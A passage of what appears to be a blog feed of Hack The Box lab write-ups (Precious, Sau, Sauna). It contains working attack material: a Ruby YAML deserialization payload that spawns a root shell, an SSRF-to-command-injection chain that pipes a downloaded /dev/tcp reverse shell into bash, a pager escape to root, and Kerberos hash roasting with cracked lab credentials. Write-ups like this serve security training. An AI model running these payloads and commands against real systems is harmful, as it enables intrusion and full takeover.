+sudo -l
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let’s take a look at this script and see what it does.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;
+require &quot;yaml&quot;
+require &apos;rubygems&apos;
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read(&quot;dependencies.yml&quot;))
+end
+
+def list_local_gems
+    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
+end
+
+gems_file = list_from_file
+gems_local = list_local_gems
+
+gems_file.each do |file_name, file_version|
+    gems_local.each do |local_name, local_version|
+        if(file_name == local_name)
+            if(file_version != local_version)
+                puts &quot;Installed version differs from the one specified in file: &quot; + local_name
+            else
+                puts &quot;Installed version is equals to the one specified in file: &quot; + local_name
+            end
+        end
+    end
+end
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This script doesn’t do much besides calling YAML.load on the content of the file dependencies.yml{:.filepath} from our working directory. When looking into vulnerabilities affecting YAML.load, we discover that it is not safe to use with user supplied data. We also run into this wonderful post that describes a gadget chain we could potentially use to execute commands as root. We’ll modify the command within the YAML payload from the post to spawn an interactive root shell&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &amp;amp;1 !ruby/object:Net::BufferedIO
+      io: &amp;amp;1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: &quot;abc&quot;
+      debug_output: &amp;amp;1 !ruby/object:Net::WriteAdapter
+         socket: &amp;amp;1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module &apos;Kernel&apos;
+                 method_id: :system
+             git_set: &quot;bash -pi&quot;
+         method_id: :resolve
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now with the YAML payload dependencies.yml{:.filepath} in our working directory, we execute the vulnerable script with sudo&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# henry@precious.htb (SSH)
+sudo /usr/bin/ruby /opt/update_dependencies.rb # trigger the payload
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The command successfully spawns a root shell, from which we can read the final flag at /root/root.txt{:.filepath}&lt;/p&gt;
+&lt;h3&gt;Alternative Solution&lt;/h3&gt;
+&lt;p&gt;Another way we could get the root flag is by using the script at /opt/update_dependencies.rb{:.filepath} to read files through a symlink. When the script looks for dependencies.yml{:.filepath} in the working directory, it will find a planted symlink that will point to /root/root.txt{:.filepath}. When the script tries to parse the file as YAML, it will display an error containing the file contents.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# henry@precious.htb (SSH)
+cd $(mktemp -d)
+ln -s /root/root.txt ./dependencies.yml # create symlink
+sudo /usr/bin/ruby /opt/update_dependencies.rb # read /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>Sau HTB Writeup</title><link>https://fuwari.vercel.app/posts/sau/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/sau/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Sau is an easy Linux-based Hack the Box machine created by sau123 that involves web exploitation, Server Side Request Forgery (SSRF), Common Vulnerabilities and Exposures (CVEs), and Sudo policy exploitation. A port scan initially revealed an HTTP server vulnerable to an SSRF bug tracked as CVE-2023-27163. The vulnerability was exploited to contact an internal HTTP server running an outdated version of Mailtrail prone to shell command injection, which we used to establish a reverse shell as puma. The sudo policy for this user allowed us to exploit CVE-2023-26604 and gain execution as root.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We began by conducting a full TCP port scan using a tuned nmap command. This command quickly and reliably scans for any relevant TCP ports on the target.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Run a thorough port scan
+nmap &quot;10.10.11.224&quot; -vv -Pn -sT -sV -n -p- -T4 --min-rate=1000 --max-retries=3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The scan reported two open ports and two filtered ports:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Port&lt;/th&gt;
+&lt;th&gt;Service&lt;/th&gt;
+&lt;th&gt;Product&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;22&lt;/td&gt;
+&lt;td&gt;ssh&lt;/td&gt;
+&lt;td&gt;OpenSSH&lt;/td&gt;
+&lt;td&gt;8.4p1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;80&lt;/td&gt;
+&lt;td&gt;HTTP&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;8338&lt;/td&gt;
+&lt;td&gt;HTTP&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;55555&lt;/td&gt;
+&lt;td&gt;HTTP&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;We first navigated to &lt;a href=&quot;http://10.10.11.224:55555&quot;&gt;http://10.10.11.224:55555&lt;/a&gt; which prompted a redirection to http://10.10.11.224:55555/web. On this page we noticed a footer indicating that the site was powered by request-baskets version 1.2.1.&lt;/p&gt;
+&lt;p&gt;We searched for CVEs affecting this installation and found an SSRF bug, CVE-2023-27163. The CVEDetails page for this bug provided a vulnerability description along with a link to additional exploitation details.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;h3&gt;CVE-2023-27163&lt;/h3&gt;
+&lt;p&gt;According to the brief proof-of-concept referenced on the dedicated CVEDetails page, a special HTTP POST request should be made to /api/baskets/*{:.filepath} to create a new basket and set a forwarding URL. A simple shell script was made to streamline this process.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env zsh
+[ $# -lt 1 ] &amp;amp;&amp;amp; echo &apos;Usage: ./ssrf-curl &amp;lt;URL&amp;gt; [OPTS ...]&apos; &amp;amp;&amp;amp; exit 1
+
+echo &apos;{&quot;proxy_response&quot;:true,&quot;expand_path&quot;:true}&apos; |
+  jq -c --arg a &quot;$1&quot; &apos;.forward_url=$a&apos; |
+  read json
+
+basket=$(openssl rand -hex 8)
+curl -so /dev/null -d &quot;$json&quot; &quot;http://10.10.11.224:55555/api/baskets/${basket}&quot;
+curl -s &quot;http://10.10.11.224:55555/${basket}&quot; ${@:2}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Mailtrail&lt;/h3&gt;
+&lt;p&gt;We used this script to indirectly access the HTTP server on port 80, since it cannot be accessed directly. A simple HTTP GET request was sent to verify the existence of the HTTP server and collect information.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Test SSRF script
+zsh ssrf.zsh http://localhost:80 -i | more
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
+Cache-Control: no-cache
+Connection: close
+Content-Security-Policy: default-src &apos;self&apos;; style-src &apos;self&apos; &apos;unsafe-inline&apos;; img-src * blob:; script-src &apos;self&apos; &apos;unsafe-eval&apos; https://stat.ripe.net; frame-src *; object-src &apos;none&apos;; block-all-mixed-content;
+Content-Type: text/html
+Date: Thu, 28 Dec 2023 08:44:05 GMT
+Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT
+Server: Maltrail/0.53
+Transfer-Encoding: chunked
+
+&amp;lt;!DOCTYPE html&amp;gt;
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A software fingerprint was found in the HTTP “Server” header with the value “Maltrail/0.53”. We searched the web for vulnerabilities affecting this version and found an OS command injection flaw disclosed here.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Description&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Maltrail &amp;lt;= v0.54 is vulnerable to unauthenticated OS command injection during the login process.**
+Summary&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[…] An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.
+Proof of Concept&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;curl &apos;http://hostname:8338/login&apos; --data &apos;username=;&lt;code&gt;id &amp;gt; /tmp/bbq&lt;/code&gt;&apos;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It looks like the installed version can be exploited through the username parameter on the login endpoint at http://localhost/login, which can be accessed with the SSRF script. We started a PwnCat listener and proceeded to execute a simple bash reverse shell downloaded over HTTP.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Start PwnCat listener
+lhost=&quot;10.10.14.2&quot; # Change to your assigned VPN IP address
+pwncat-cs -l $lhost 8443 # Install: `python3 -m pip install pwncat-cs`
+
+# [In another session] Serve reverse shell over HTTP
+lhost=&quot;10.10.14.2&quot; # Change to your assigned VPN IP address
+mkdir ./http-share &amp;amp;&amp;amp; echo &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/${lhost}/8443 &amp;lt;&amp;amp;1&quot; &amp;gt; http-share/index.html
+http-server ./http-share -p 8080 -a $lhost # Install: `npm install -g http-server`
+
+# [In another session] Trigger command execution
+lhost=&quot;10.10.14.2&quot; # Change to your assigned VPN IP address
+zsh ssrf.zsh http://localhost:80/login -i -d &quot;username=\`curl ${lhost}:8080|bash\`&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation &amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;With execution as the user puma, We found a custom sudo policy that allows us to execute a particular command as any user without the password for puma.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Display sudo policy
+sudo -l
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;CVE-2023-26604&lt;/h3&gt;
+&lt;p&gt;The command we can run in a privileged context is /usr/bin/systemctl status trail.service. After searching the web for known vulnerabilities in systemd/systemctl, a fairly recent privilege escalation CVE tracked as CVE-2023-26604 was found.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;systemd before 247 does not adequately block local privilege escalation for some Sudo configurations, e.g., plausible sudoers files in which the “systemctl status” command may be executed. Specifically, systemd does not set LESSSECURE to 1, and thus other programs may be launched from the less program. This presents a substantial security risk when running systemctl from Sudo, because less executes as root when the terminal size is too small to show the complete systemctl output.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We checked the systemd version and noticed that the vulnerable version systemd 245 was installed.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Check if systemd version is vulnerable
+/usr/bin/systemctl --version
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;systemd 245 (245.4-4ubuntu3.22)
++PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Exploitation&lt;/h3&gt;
+&lt;p&gt;To exploit CVE-2023-26604, the terminal height was lowered as described in the CVE description, and the allowed sudo command was executed. From the pager we simply entered !sh to spawn a root shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# execute systemctl with lower resolution to spawn pager
+stty rows 1 &amp;amp;&amp;amp; sudo systemctl status trail.service
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;!sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Root !&lt;/p&gt;
+</content:encoded></item><item><title>Sauna HTB Writeup</title><link>https://fuwari.vercel.app/posts/sauna/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/sauna/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn&amp;amp;#039;t require Kerberos pre-authentication.&lt;/p&gt;
+&lt;p&gt;This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-All extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket&amp;amp;#039;s psexec.py in order to gain a shell on the box as NT_AUTHORITY\SYSTEM.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; ping -c 1 10.10.10.175
+
+PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
+64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=140 ms
+
+--- 10.10.10.175 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 139.637/139.637/139.637/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can see from the port scan it leaks the Domain EGOTISTICAL-BANK.LOCAL. There are also three services that have a goof attack surface http 80, smb 445 and ldap 389.&lt;/p&gt;
+&lt;p&gt;We can also look and see that this is probably a domain controller. Having ports; 53 DNS, 88 Kerberos and 445 are common DC ports.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sS --open -p- --min-rate 5000 -n -Pn -v -oG 10.10.10.175 nmap 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Port&lt;/th&gt;
+&lt;th&gt;Service&lt;/th&gt;
+&lt;th&gt;Product&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;53&lt;/td&gt;
+&lt;td&gt;domain&lt;/td&gt;
+&lt;td&gt;Simple DNS Plus&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;80&lt;/td&gt;
+&lt;td&gt;HTTP&lt;/td&gt;
+&lt;td&gt;Microsoft IIS httpd&lt;/td&gt;
+&lt;td&gt;10.0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;88&lt;/td&gt;
+&lt;td&gt;kerberos-sec&lt;/td&gt;
+&lt;td&gt;Microsoft Windows Kerberos&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;135&lt;/td&gt;
+&lt;td&gt;msrpc&lt;/td&gt;
+&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;139&lt;/td&gt;
+&lt;td&gt;netbios-ssn&lt;/td&gt;
+&lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;389&lt;/td&gt;
+&lt;td&gt;ldap&lt;/td&gt;
+&lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;445&lt;/td&gt;
+&lt;td&gt;microsoft-ds&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;464&lt;/td&gt;
+&lt;td&gt;kpasswd5&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;593&lt;/td&gt;
+&lt;td&gt;ncacn_http&lt;/td&gt;
+&lt;td&gt;Microsoft Windows RPC over HTTP&lt;/td&gt;
+&lt;td&gt;1.0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;636&lt;/td&gt;
+&lt;td&gt;tcpwrapped&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;3268&lt;/td&gt;
+&lt;td&gt;ldap&lt;/td&gt;
+&lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;3269&lt;/td&gt;
+&lt;td&gt;tcpwrapped&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;5985&lt;/td&gt;
+&lt;td&gt;http&lt;/td&gt;
+&lt;td&gt;Microsoft HTTPAPI httpd&lt;/td&gt;
+&lt;td&gt;2.0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;9389&lt;/td&gt;
+&lt;td&gt;mc-nmf&lt;/td&gt;
+&lt;td&gt;.NET Message Framing&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;49667&lt;/td&gt;
+&lt;td&gt;msrpc&lt;/td&gt;
+&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;49677&lt;/td&gt;
+&lt;td&gt;ncacn_http&lt;/td&gt;
+&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+&lt;td&gt;HTTP 1.0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;49676&lt;/td&gt;
+&lt;td&gt;msrpc&lt;/td&gt;
+&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;49677&lt;/td&gt;
+&lt;td&gt;msrpc&lt;/td&gt;
+&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;49706&lt;/td&gt;
+&lt;td&gt;msrpc&lt;/td&gt;
+&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;49775&lt;/td&gt;
+&lt;td&gt;msrpc&lt;/td&gt;
+&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Active Directory&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;h3&gt;Web - Port 80&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;On the about page http://10.10.10.175/about.html, we can see that there is a “Meet The Team” section and find a handful of people. I recorded each of the name in the file called listUsers.txt.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; cat listUsers.txt 
+
+Fergus Smith
+Shaun Coins
+Hugo Bear
+Bowie Taylor
+Sophie Driver
+Steven Kerb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next I’ll use a tool called username-anarchy to transform the word list of names to one with common usernames schemas, Tool Here&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; ./username-anarchy --input-file listUsers.txt --select-format first,last,first.last,flast &amp;gt; users.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I’ll also add Administrator to the file as well.&lt;/p&gt;
+&lt;h3&gt;SMB - Port 445 Recon&lt;/h3&gt;
+&lt;p&gt;I like to use crackmapexec to enumerate SMB.&lt;/p&gt;
+&lt;p&gt;We can see the hostname, domain and see idf SMBv1 is enable.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175  
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We cant view any shares.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175 --shares
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Sometimes we can try doing a null session to see if we can get anything else. A null sessions is simply providing nothing for the username and password. But still nothing.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175 --shares -u &apos;&apos; -p &apos;&apos;
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
+SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can also try another tool called smbmap to see if it gives us anything different but it doesn’t.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; smbmap -H 10.10.10.175
+
+[+] IP: 10.10.10.175:445        Name: 10.10.10.175 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Kerbrute&lt;/h3&gt;
+&lt;p&gt;Now that I have a list of posible usernames i can use a tool called kerbrute to test and see if any of the usernames are valid.&lt;/p&gt;
+&lt;p&gt;The cool thing about kerburte is it won’t create event id 4625 in the logs. Event id 4625 will document every failed log-on. This will instead create a Kerberos Failure event id 4771, its not logged by default.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL listUser.txt
+
+2024/02/18 09:31:07 &amp;gt;  Using KDC(s):
+2024/02/18 09:31:07 &amp;gt;  	10.10.10.175:88
+
+2024/02/18 09:31:07 &amp;gt;  [+] VALID USERNAME:	fsmith@EGOTISTICAL-BANK.LOCAL
+2024/02/18 09:31:07 &amp;gt;  Done! Tested 12 usernames (1 valid) in 0.285 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Kerberoast&lt;/h3&gt;
+&lt;p&gt;Now that we have two valid usernames we can leverage some impacket scripts Impacket github. The one I used on this machine was GetNPUser.py which will do an AS_REP Roast/Kerberoast.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith 
+
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bfa9cf66c4efa162cd18472a39b04966$5c796f89e55dfba2c4b0eccfa2b4198679aeddbfbddc37430a2bc75a49e472e05ccc330187a59c43f603b58e124e4c864c7d02d056056c6d782b32ca6156bb7b7b530effe162bdb7d7ce8470bebf8ce61238e23648957feed32538f0ee1f417c420243316ffb917605e649d42e249a5b2726a59ee9d2816edf045407b88dade504d12f41942faf1f244f5f29dc187e1c964677f66dc2e0160b6e56693f7f8a22816836215ecf22188e5024fb37f57e8e74b274d8eaa5b1296055ed33471620245ec1c7fb0653d0cd053156c314e181d0719c9f75c1032e3a4215c310378a1f3002ab5936223251ac1ea2190bf6fd74eb2c18e18067f186f1415533fddd6dea50
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now that we have a hash we can use hashcat to crack it, I did this on my host machine to utileze a GPU. we get a hit and now have a creds fsmith:Thestrokes23&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; .\hascat.exe -m 18200 ..\hash ..\rockyou.txt --force
+
+fsmith:Thestrokes23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;SMB PT2&lt;/h3&gt;
+&lt;p&gt;Now that we have some valid credentials fsmith:Thestrokes23 we can try and authenticate to SMB again using crackmapexec and we can see that we have valid creds!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next I will enumerate shares and one sticks out RICOH Aficio SP 8300DN PCL 6&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
+SMB         10.10.10.175    445    SAUNA            [+] Enumerated shares
+SMB         10.10.10.175    445    SAUNA            Share           Permissions     Remark
+SMB         10.10.10.175    445    SAUNA            -----           -----------     ------
+SMB         10.10.10.175    445    SAUNA            ADMIN$                          Remote Admin
+SMB         10.10.10.175    445    SAUNA            C$                              Default share
+SMB         10.10.10.175    445    SAUNA            IPC$            READ            Remote IPC
+SMB         10.10.10.175    445    SAUNA            NETLOGON        READ            Logon server share 
+SMB         10.10.10.175    445    SAUNA            print$          READ            Printer Drivers
+SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6                 We cant print money
+SMB         10.10.10.175    445    SAUNA            SYSVOL          READ            Logon server share 
+                                                                                                      
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Taking a look at searchsploit there are a handful of exploits for this but we need a shell first. We can see that we can authenticate with winrm.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec winrm 10.10.10.175 -u &apos;fsmith&apos; -p &apos;Thestrokes23&apos; 
+SMB         10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
+HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
+WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I’ll use evil-winrm to get shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; evil-winrm -u fsmith -i 10.10.10.175 -p Thestrokes23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Taking a look at the Desktop we can grab our user flag.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;h3&gt;Lateral movement&lt;/h3&gt;
+&lt;p&gt;I uploaded a great tool called winPEAS that is great for some automation when trying to escalate. I uploaded it using Evil-Winrm&lt;/p&gt;
